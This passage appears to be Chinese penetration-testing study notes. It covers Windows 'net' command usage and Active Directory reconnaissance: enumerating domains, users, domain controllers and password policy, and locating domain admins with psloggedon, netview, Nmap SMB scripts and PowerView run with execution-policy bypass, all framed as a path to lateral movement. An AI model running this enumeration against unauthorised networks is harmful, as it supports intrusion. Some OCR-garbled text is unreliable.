`\\computername`要检查或同步的服务器名‐`/domain[:name]`指定要与其时间同步的域‐ `/set`使本计算机时钟与指定计算机或域的时钟同步。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Start"><a href="#Net-Start" class="headerlink" title="Net Start"></a>Net Start</h3><pre class="line-numbers language-none"><code class="language-none">作用：启动服务，或显示已启动服务的列表。命令格式：#开启指定服务Net start service名称#显示已开启服务net start <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Pause"><a href="#Net-Pause" class="headerlink" title="Net Pause"></a>Net Pause</h3><pre class="line-numbers language-none"><code class="language-none">作 用：暂停正在运行的服务。命令格式：`Net pause service`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Net-Continue"><a href="#Net-Continue" class="headerlink" title="Net Continue"></a>Net Continue</h3><pre class="line-numbers language-none"><code class="language-none">作用：重新激活挂起的服务。命令格式：`Net continue service`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Net-Stop"><a href="#Net-Stop" class="headerlink" title="Net Stop"></a>Net Stop</h3><pre class="line-numbers language-none"><code class="language-none">作用：停止 Windows NT/2000/2003 网络服务。命令格式：`Net stop service`下面我们来看看上面四条命令里服务包含哪些服务：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Net-Statistics"><a href="#Net-Statistics" class="headerlink" title="Net Statistics"></a>Net Statistics</h3><pre class="line-numbers language-none"><code class="language-none">作用：显示本地工作站或服务器服务的统计记录。命令格式：`Net statistics [workstation | server]`有关参数说明：∙键入不带参数的Net statistics列出其统计信息可用的运行服务∙`workstation`显示本地工作站服务的统计信息∙`server`显示本地服务器服务的统计信息例如：Net statistics server | more显示服务器服务的统计信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Share"><a href="#Net-Share" class="headerlink" title="Net Share"></a>Net Share</h3><pre class="line-numbers language-none"><code class="language-none">作用：创建、删除或显示共享资源。命令格式：`Net share sharename=drive:path [/users:number | /unlimited] [/remark:"text"]`有关参数说明：∙ 键入不带参数的Net share显示本地计算机上所有共享资源的信息∙ `sharename`是共享资源的网络名称∙ `drive:path`指定共享目录的绝对路径∙ `/users:number`设置可同时访问共享资源的最大用户数∙ `/unlimited`不限制同时访问共享资源的用户数∙ `/remark:"text "`添加关于资源的注释，注释文字用引号引住例如： `Net share yesky=c:\temp /remark:"my first share"`以yesky为共享名共享C:\temp`Net share yesky /delete`停止共享yesky目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Session"><a href="#Net-Session" class="headerlink" title="Net Session"></a>Net Session</h3><pre class="line-numbers language-none"><code class="language-none">作用：列出或断开本地计算机和与之连接的客户端的会话。命令格式：`Net session [\\computername] [/delete]`有关参数说明：∙键入不带参数的Net session显示所有与本地计算机的会话的信息。∙`\\computername`标识要列出或断开会话的计算机。∙`/delete`结束与 `\computername` 计算机会话并关闭本次会话期间计算机的所有打开文件。如果省略`\computername` 参数，将取消与本地计算机的所有会话。例如：`Net session [url=file://\\GHQ]\\GHQ[/url]`要显示计算机名为GHQ的客户端会话信息列表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Send"><a href="#Net-Send" class="headerlink" title="Net Send"></a>Net Send</h3><pre class="line-numbers language-none"><code class="language-none">作用：向网络的其他用户、计算机或通信名发送消息。命令格式：`Net send {name | * | /domain[:name] | /users} message`有关参数说明：∙`name`要接收发送消息的用户名、计算机名或通信名∙* 将消息发送到组中所有名称∙`/domain[:name]`将消息发送到计算机域中的所有名称∙`/users`将消息发送到与服务器连接的所有用户∙`message`作为消息发送的文本例如：`Net send /users server will shutdown in 10 minutes`.给所有连接到服务器的用户发送消息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Print"><a href="#Net-Print" class="headerlink" title="Net Print"></a>Net Print</h3><pre class="line-numbers language-none"><code class="language-none">作用：显示或控制打印作业及打印队列。命令格式：`Net print [\\computername ] job# [/hold | /release | /delete]`有关参数说明：∙`computername`共享打印机队列的计算机名∙`sharename`打印队列名称∙`job#`在打印机队列中分配给打印作业的标识号∙`/hold`使用`job#`时，在打印机队列中使打印作业等待∙`/release`释放保留的打印作业∙`/delete`从打印机队列中删除打印作业例如：`Net print \\GHQ\HP8000列出[url=file://\\GHQ]\\GHQ[/url]`计算机上HP8000打印机队列的目录。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Name"><a href="#Net-Name" class="headerlink" title="Net Name"></a>Net Name</h3><pre class="line-numbers language-none"><code class="language-none">作用：添加或删除消息名（有时也称别名），或显示计算机接收消息的名称列表。命令格式：`Net name [name [/add | /delete]]`有关参数说明：∙键入不带参数的Net name列出当前使用的名称∙`name`指定接收消息的名称∙`/add`将名称添加到计算机中∙`/delete`从计算机中删除名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Localgroup"><a href="#Net-Localgroup" class="headerlink" title="Net Localgroup"></a>Net Localgroup</h3><pre class="line-numbers language-none"><code class="language-none">作 用：添加、显示或更改本地组。命令格式：`Net localgroup groupname {/add [/comment:"text "] | /delete} [/domain]`有关参数说明：∙键入不带参数的`Net localgroup`显示服务器名称和计算机的本地组名称∙`groupname`要添加、扩充或删除的本地组名称∙`/comment: "text "`为新建或现有组添加注释∙`/domain`在当前域的主域控制器中执行操作，否则仅在本地计算机上执行操作∙`name [ ...]`列出要添加到本地组或从本地组中删除的一个或多个用户名或组名∙`/add`将全局组名或用户名添加到本地组中∙`/delete`从本地组中删除组名或用户名例如：`Net localgroup ggg /add` 将名为ggg的本地组添加到本地用户帐号数据库；`Net localgroup ggg` 显示ggg本地组中的用户。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Group"><a href="#Net-Group" class="headerlink" title="Net Group"></a>Net Group</h3><pre class="line-numbers language-none"><code class="language-none">作 用：在 Windows NT/2000/2003 Server 域中添加、显示或更改全局组。命令格式：`Net group groupname {/add [/comment:"text "] | /delete} [/domain]`有关参数说明：∙键入不带参数的Net group显示服务器名称及服务器的组名称∙`groupname`要添加、扩展或删除的组∙`/comment:"text "`为新建组或现有组添加注释∙`/domain`在当前域的主域控制器中执行该操作，否则在本地计算机上执行操作∙`username[ ...]`列表显示要添加到组或从组中删除的一个或多个用户∙`/add`添加组或在组中添加用户名∙`/delete`删除组或从组中删除用户名例如：`Net group ggg GHQ1 GHQ2 /add`将现有用户帐号GHQ1和GHQ2添加到本地计算机的ggg组。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-File"><a href="#Net-File" class="headerlink" title="Net File"></a>Net File</h3><pre class="line-numbers language-none"><code class="language-none">作用：显示某服务器上所有打开的共享文件名及锁定文件数。命令格式：`Net file [id [/close]]`有关参数说明：∙键入不带参数的Net file获得服务器上打开文件的列表∙`id`文件标识号∙/close关闭打开的文件并释放锁定记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Config"><a href="#Net-Config" class="headerlink" title="Net Config"></a>Net Config</h3><pre class="line-numbers language-none"><code class="language-none">作用：显示当前运行的可配置服务，或显示并更改某项服务的设置。命令格式：`Net config [service [options]]`有关参数说明：∙键入不带参数的Net config显示可配置服务的列表∙`service`通过Net config命令进行配置的服务(server或workstation)`options`服务的特定选项<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Computer"><a href="#Net-Computer" class="headerlink" title="Net Computer"></a>Net Computer</h3><pre class="line-numbers language-none"><code class="language-none">作用：从域数据库中添加或删除计算机命令格式：Net computer \computername {/add | /del}有关参数说明：∙\\computername指定要添加到域或从域中删除的计算机∙/add将指定计算机添加到域∙/del将指定计算机从域中删除例如：Net computer \\js /add 将计算机js添加到登录域。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="查询域"><a href="#查询域" class="headerlink" title="查询域"></a>查询域</h2><p>查询域的命令如下 </p><p>如果出现”此工作组的服务器列表当前无法使用” 开启服务：Server ，WorkStation，computer Browser,关闭防火 墙</p><pre class="line-numbers language-none"><code class="language-none">net view /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131401688.png" alt="image-20221230131401688"></p><h2 id="查询域内所有计算机"><a href="#查询域内所有计算机" class="headerlink" title="查询域内所有计算机"></a>查询域内所有计算机</h2><pre class="line-numbers language-none"><code class="language-none">net view /domain:域名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131434667.png" alt="image-20221230131434667"></p><p>执行如下命令,就可以通过查询得到的主机名对主机角色进行初步判断,如图。例如,”dev”可能是开发服务 器,”web””app”可能是Web服务器,”NAS”可能是存储服务器” fileserver”可能是文件服务器等。</p><h2 id="查询域内所有用户组列表"><a href="#查询域内所有用户组列表" class="headerlink" title="查询域内所有用户组列表"></a>查询域内所有用户组列表</h2><pre class="line-numbers language-none"><code class="language-none">net group /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131515234.png" alt="image-20221230131515234"></p><p>执行如下命令,查询域内所有用户组列表。 </p><p>系统自带的常见用户身份如下：</p><pre class="line-numbers language-none"><code class="language-none">DomainAdmins:域管理员。DomainComputers:域内机器。DomainControllers:域控制器。DomainGusers:域访客,权限较低。DomainUser:域用户。EnterpriseAdmins:企业系统管理员用户在默认情况下, Domain admins和Enterprise Admins对域内所有域控制器有完全控制权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查询所有域成员计算机列表"><a href="#查询所有域成员计算机列表" class="headerlink" title="查询所有域成员计算机列表"></a>查询所有域成员计算机列表</h3><p>执行如下命令，查询所有域成员计算机列表</p><pre class="line-numbers language-none"><code class="language-none">net group "domain computers" /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131637984.png" alt="image-20221230131637984"></p><h2 id="获取域密码信息"><a href="#获取域密码信息" class="headerlink" title="获取域密码信息"></a>获取域密码信息</h2><p>执行如下命令’获取域密码策略、密码长度、错误锁定等信息</p><pre class="line-numbers language-none"><code class="language-none">net accounts /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131719705.png" alt="image-20221230131719705"></p><h3 id="获取域信任信息"><a href="#获取域信任信息" class="headerlink" title="获取域信任信息"></a>获取域信任信息</h3><p>执行如下命令’获取域信任信息</p><pre class="line-numbers language-none"><code class="language-none">nltest /domain_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131757783.png" alt="image-20221230131757783"></p><h1 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h1><h2 id="查看域控制器的机器名"><a href="#查看域控制器的机器名" class="headerlink" title="查看域控制器的机器名"></a>查看域控制器的机器名</h2><p>执行如下命令,可以看到,域控制器的机器名</p><pre class="line-numbers language-none"><code class="language-none">nltest /DCLIST:hack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131916520.png" alt="image-20221230131916520"></p><h2 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h2><p>执行如下命令,可以看到,域控制器的主机名</p><pre class="line-numbers language-none"><code class="language-none">nslookup -type=SRV _ldap._tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230131945852.png" alt="image-20221230131945852"></p><h2 id="查看当前时间"><a href="#查看当前时间" class="headerlink" title="查看当前时间"></a>查看当前时间</h2><p>在通常情况下,时间服务器为主域控制器。执行如下命令</p><pre class="line-numbers language-none"><code class="language-none">net time /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230132019771.png" alt="image-20221230132019771"></p><h2 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h2><p>执行如下命令,查看域控制器组。,其中有一台机器名为”DC”的域控制器`</p><pre class="line-numbers language-none"><code class="language-none">net group "Domain Controllers" /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230132054665.png" alt="image-20221230132054665"></p><p>在实际网络中,一个域内一般存在两台或两台以上的域控制器,其目的是:一旦主域控制器发生故障,备用的域控制器可 以保证域内的服务和验证工作正常进行。</p><h1 id="获取域内用户"><a href="#获取域内用户" class="headerlink" title="获取域内用户"></a>获取域内用户</h1><h2 id="向域控制器进行查询"><a href="#向域控制器进行查询" class="headerlink" title="向域控制器进行查询"></a>向域控制器进行查询</h2><p>执行如下命令,向域控制器DC进行查询,,域内有多个用户。其中,krbtgt 用户不仅可以创建票据授权服务(TGS)的加密 密钥,还可以实现多种域内权限持久化方法,</p><pre class="line-numbers language-none"><code class="language-none">net user /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230132635795.png" alt="image-20221230132635795"></p><h2 id="获取域内用户的详细信息"><a href="#获取域内用户的详细信息" class="headerlink" title="获取域内用户的详细信息"></a>获取域内用户的详细信息</h2><p>执行如下命令,可以获取域内用户的详细常见参数包括用户名、描述信息、SID、域名、状态等。</p><pre class="line-numbers language-none"><code class="language-none">wmic /?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ALIAS ‐ 对本地系统上可用别名的访问BASEBOARD ‐ 基板(也称为主板或系统板)管理。BIOS ‐ 基本输入/输出服务(BIOS)管理。BOOTCONFIG ‐ 启动配置管理。CDROM ‐ CD‐ROM 管理。COMPUTERSYSTEM ‐ 计算机系统管理。CPU ‐ CPU 管理。CSPRODUCT ‐ SMBIOS 中的计算机系统产品信息。DATAFILE ‐ 数据文件管理。DCOMAPP ‐ DCOM 应用程序管理。DESKTOP ‐ 用户的桌面管理。DESKTOPMONITOR ‐ 桌面监视器管理。DEVICEMEMORYADDRESS ‐ 设备内存地址管理。DISKDRIVE ‐ 物理磁盘驱动器管理。DISKQUOTA ‐ 用于 NTFS 卷的磁盘空间使用量。DMACHANNEL ‐ 直接内存访问(DMA)通道管理。ENVIRONMENT ‐ 系统环境设置管理。FSDIR ‐ 文件系统目录项管理。GROUP ‐ 组帐户管理。IDECONTROLLER ‐ IDE 控制器管理。IRQ ‐ 中断请求线路(IRQ)管理。JOB ‐ 提供对使用计划服务安排的作业的访问。LOADORDER ‐ 定义执行依赖关系的系统服务的管理。LOGICALDISK ‐ 本地存储设备管理。LOGON ‐ 登录会话。MEMCACHE ‐ 缓存内存管理。MEMORYCHIP ‐ 内存芯片信息。MEMPHYSICAL ‐ 计算机系统的物理内存管理。NETCLIENT ‐ 网络客户端管理。NETLOGIN ‐ 网络登录信息(属于特定用户)管理。NETPROTOCOL ‐ 协议(及其网络特征)管理。NETUSE ‐ 活动网络连接管理。NIC ‐ 网络接口控制器(NIC)管理。NICCONFIG ‐ 网络适配器管理。NTDOMAIN ‐ NT 域管理。NTEVENT ‐ NT 事件日志中的项目。NTEVENTLOG ‐ NT 事件日志文件管理。ONBOARDDEVICE ‐ 主板(系统板)中内置的通用适配器设备的管理。OS ‐ 已安装操作系统的管理。PAGEFILE ‐ 虚拟内存文件交换管理。PAGEFILESET ‐ 页面文件设置管理。PARTITION ‐ 物理磁盘的已分区区域的管理。PORT ‐ I/O 端口管理。PORTCONNECTOR ‐ 物理连接端口管理。PRINTER ‐ 打印机设备管理。PRINTERCONFIG ‐ 打印机设备配置管理。PRINTJOB ‐ 打印作业管理。PROCESS ‐ 进程管理。PRODUCT ‐ 安装程序包任务管理。QFE ‐ 快速修复工程。QUOTASETTING ‐ 卷上的磁盘配额设置信息。RDACCOUNT ‐ 远程桌面连接权限管理。RDNIC ‐ 对特定网络适配器的远程桌面连接管理。RDPERMISSIONS ‐ 特定远程桌面连接的权限。RDTOGGLE ‐ 远程打开或关闭远程桌面侦听程序。RECOVEROS ‐ 操作系统出现故障时将从内存收集的信息。REGISTRY ‐ 计算机系统注册表管理。SCSICONTROLLER ‐ SCSI 控制器管理。SERVER ‐ 服务器信息管理。SERVICE ‐ 服务应用程序管理。SHADOWCOPY ‐ 卷影副本管理。SHADOWSTORAGE ‐ 卷影副本存储区域管理。SHARE ‐ 共享资源管理。SOFTWAREELEMENT ‐ 系统上安装的软件产品元素的管理。SOFTWAREFEATURE ‐ SoftwareElement 的软件产品子集的管理。SOUNDDEV ‐ 声音设备管理。STARTUP ‐ 当用户登录到计算机系统时自动运行的命令的管理。SYSACCOUNT ‐ 系统帐户管理。SYSDRIVER ‐ 基本服务的系统驱动程序管理。SYSTEMENCLOSURE ‐ 物理系统外壳管理。SYSTEMSLOT ‐ 物理连接点(包括端口、插槽和外设以及专用连接点)的管理。TAPEDRIVE ‐ 磁带驱动器管理。TEMPERATURE ‐ 温度传感器(电子温度计)数据管理。TIMEZONE ‐ 时区数据管理。UPS ‐ 不间断电源(UPS)管理。USERACCOUNT ‐ 用户帐户管理。VOLTAGE ‐ 电压传感器(电子电压表)数据管理。查看存在的用户执行如下命令,可以看到,域内用户（server机器有这个命令）常用的 dsquery命令：查询本地管理员组用户Domain admin组中的用户默认为域内机器的本地管理员用户 在实际应用中’为了方便管 理’会有域用户被设置为域机器的本地管理员用户°VOLUME ‐ 本地存储卷管理。VOLUMEQUOTASETTING ‐ 将磁盘配额设置与特定磁盘卷相关联。VOLUMEUSERQUOTA ‐ 每用户存储卷配额管理。WMISET ‐ WMI 服务操作参数管理。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get/allwmic useraccount get domain,name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230132729878.png" alt="image-20221230132729878"></p><h2 id="查看存在的用户"><a href="#查看存在的用户" class="headerlink" title="查看存在的用户"></a>查看存在的用户</h2><p>执行如下命令,可以看到,域内用户（server机器有这个命令）</p><pre class="line-numbers language-none"><code class="language-none">dsquery user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230132814936.png" alt="image-20221230132814936"></p><p>常用的 dsquery命令：</p><pre class="line-numbers language-none"><code class="language-none">dsquery computer ‐查找目录中的计算dsquery contact ‐查找目录中的职系人dsquery subnet ‐目录中的子网dsquery group ‐查找目录中的组,dsquery ou ‐查找目录中的组织单位,dsquery site ‐最找目景中的站成dsquery server ‐查找目录中的ADDC/LDs实例asquery user ‐查找目录中的用户dsquery quota ‐查找目录中的配颗机定dsquery partition ‐查找目录中的分区<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="查询本地管理员组用户"><a href="#查询本地管理员组用户" class="headerlink" title="查询本地管理员组用户"></a>查询本地管理员组用户</h2><pre class="line-numbers language-none"><code class="language-none">net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Domain admin组中的用户默认为域内机器的本地管理员用户 在实际应用中’为了方便管 理’会有域用户被设置为域 机器的本地管理员用户。</p><p><img src="assets/image-20221230132912743.png" alt="image-20221230132912743"></p><h2 id="查询域管理用户"><a href="#查询域管理用户" class="headerlink" title="查询域管理用户"></a>查询域管理用户</h2><pre class="line-numbers language-none"><code class="language-none">net group "domain admins" /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230132940917.png" alt="image-20221230132940917"></p><h2 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h2><pre class="line-numbers language-none"><code class="language-none">net group "Enterprise Admins" /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230133028737.png" alt="image-20221230133028737"></p><h1 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h1><p>在内网中，通常会部署大址的网络安全系统和设备,例如IDS、IPS、日志审计、安全网关、 反病毒软件等。在域网 络攻击测试中,获取域内的一个支点后，需要获取域管理员权限. 在一个域中，当计算机加入域后，会默认给域管理 员组赋予本地系统管理员权限,也就是说, 当目机被添加到城中.成为域的成员主机后，系统会自动将域管理员组添加 到本地系统管理员组中，因此域管理员组的成员都可以访问本地计算机，且具备安全控制权限 </p><p>定位域内管理员的常规果道，一是日志，二是会话。日志是指本地机器的管理员日志，会话是指域内每台机器的登 录会话 </p><p>假设已经在Windows域中取得了普通用户权限，希望在城内横向移动，需 要知道域内用户登录的位置、他是否是 任何系统的本地管理员、他所属的组、他是否有权访问文 件共享等。枚举主机、用户和组，有助于更好地了解域的 布局。</p><h2 id="手动定位域管理员"><a href="#手动定位域管理员" class="headerlink" title="手动定位域管理员"></a>手动定位域管理员</h2><pre class="line-numbers language-none"><code class="language-none">net view /domain 查看当前域名net view /domain:域名 查看域内部所有计算机名net group /domain 查看域内部所有用户组列表net group "domain computers" /domain 查看所有域成员计算机列表net accounts /domain 查看域密码信息nltest /domian_trusts 获取域信任信息nltest /DCLIST:域名 查看域控制器机器名net time /domain 查看当前时间，因为时间服务器也是主域服务器，可以看到域服务器的机器名net group "Domain Controllers" /domain 查看域控制器组，因为可能有不止一台域控，有主备之分net user /domain 查询域内用户，会看到熟悉的krbtgt用户wmic useraccount get /all 获取域内用户详细信息dsquery user 查看域内存在的用户net localgroup administrators 查看本地管理员用户组net group "domain admins" /domain 查询域管理员用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="psloggedom-exe工具"><a href="#psloggedom-exe工具" class="headerlink" title="psloggedom.exe工具"></a>psloggedom.exe工具</h2><p>psloggedon.exe 可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定了用户名 而不是计算 机，psloggedon.exe 会搜索<strong>网络邻居</strong>中的计算机，并显示该用户当前是否已登录。</p><pre class="line-numbers language-none"><code class="language-none">psloggedon.exe [‐] [‐l] [‐x] [\\computername或username]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">psloggedon.exe \\dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230133259597.png" alt="image-20221230133259597"></p><pre class="line-numbers language-none"><code class="language-none">psloggedon.exe administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230133308432.png" alt="image-20221230133308432"></p><h2 id="PVEDFindADUser-exe工具"><a href="#PVEDFindADUser-exe工具" class="headerlink" title="PVEDFindADUser.exe工具"></a>PVEDFindADUser.exe工具</h2><p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录 的用户，包括本地用户、通过RDP 登录的用户、用于运行服务和计划任务的用户账 户。运行该工具的计算机需要 具有**.NETFramework 2.0<strong>，并且需要具有</strong>管理员权限**</p><pre class="line-numbers language-none"><code class="language-none">‐h：显示帮助信息‐current["username"]：如果仅指定‐current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名（Domain\Username），则显示该用户登录的计算机‐last["username"]：如果仅指定‐last参数，将获取目标计算机上最后一个登录用户。如果指定了用户名（Domain\Username），则显示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户名，此时使用该工具可能无法得到用户名‐noping：阻止该工具在获取用户登陆信息之前对目标执行ping命令‐target：可选参数，用于指定要查询的主机。如果未指定该参数，将查询域中的所有主机。如果指定了此参数，主机名列表由逗号分隔<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#显示域中所有计算机上当前登录的用户pvefindaduser.exe -current<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20221230133347199.png" alt="image-20221230133347199"></p><h2 id="netview-exe"><a href="#netview-exe" class="headerlink" title="netview.exe"></a>netview.exe</h2><p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用NetSessionEnum找寻登陆会话，利NetShareEnum 找寻共享，利用NetWkstaUserEnum枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。 netview.exe的绝大部分功能不需要管理员权限就可以使用。</p><pre class="line-numbers language-none"><code class="language-none">使用语法：netview.exe &lt;参数&gt;‐h：显示帮助菜单。‐f filename.txt：指定从中提取主机列表的文件。‐e filename.txt：指定要排除的主机名文件。‐o filename.txt：将所有输出重定向到文件。‐d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。‐g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。‐c：检查对已找到共享的访问权限。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230133418381.png" alt="image-20221230133418381"></p><h2 id="NSE脚本"><a href="#NSE脚本" class="headerlink" title="NSE脚本"></a>NSE脚本</h2><p>如果存在域账户或者本地账户就可以使用Nmap的smb-enum-sessions.nes引擎获取远程机器的登录会话（不需要 管理员权限）。</p><pre class="line-numbers language-none"><code class="language-none">smb‐enum‐domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等smb‐enum‐users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描smb‐enum‐shares：遍历远程主机的共享目录smb‐enum‐processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。smb‐enum‐sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。smb‐os‐discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PowerView脚本"><a href="#PowerView脚本" class="headerlink" title="PowerView脚本"></a>PowerView脚本</h2><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、 Invoke-UserHunter 等，</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command "&amp; { import-module .\PowerView.ps1;Invoke-UserHunter}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230133523127.png" alt="image-20221230133523127"></p><h1 id="PowerShell使用方式"><a href="#PowerShell使用方式" class="headerlink" title="PowerShell使用方式"></a>PowerShell使用方式</h1><p>Powershell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。你可以把 它看成是命令行提示符cmd.exe的扩充，不对，应当是颠覆。 powershell需要.NET环境的支持，同 时支持.NET对象。微软之所以将Powershell 定位为Power，并不是夸大其词，因为它完全支持对 象。其可读性，易用性，可以位居当前所有shell之首。 当前powershell有四版本，分别为1.0， 2.0，3.0 ,4.0 </p><p>如果您的系统是window7或者Windows Server 2008，那么PowerShell 2.0已经内置了，可以升级 为3.0，4.0。如果您的系统是Windows 8 或者Windows server 2012，那么PowerShell 3.0已经内 置了，可以升级为4.0。如果您的系统为Windows 8.1或者Windows server 2012 R2，那默认已经 是4.0了。</p><h2 id="powershell控制台"><a href="#powershell控制台" class="headerlink" title="powershell控制台"></a>powershell控制台</h2><p>右击标题栏选择”属性”弹出powershell控制台对话框。在这里有四个选项卡：选项、字体、布局 和颜色。 </p><h3 id="1、【选项】设置光标，历史记录，编辑模式的切换"><a href="#1、【选项】设置光标，历史记录，编辑模式的切换" class="headerlink" title="1、【选项】设置光标，历史记录，编辑模式的切换"></a>1、【选项】设置光标，历史记录，编辑模式的切换</h3><p><img src="assets/image-20221230133656476.png" alt="image-20221230133656476"></p><h3 id="2、【字体】设置字体的名称和大小"><a href="#2、【字体】设置字体的名称和大小" class="headerlink" title="2、【字体】设置字体的名称和大小"></a>2、【字体】设置字体的名称和大小</h3><p><img src="assets/image-20221230133713788.png" 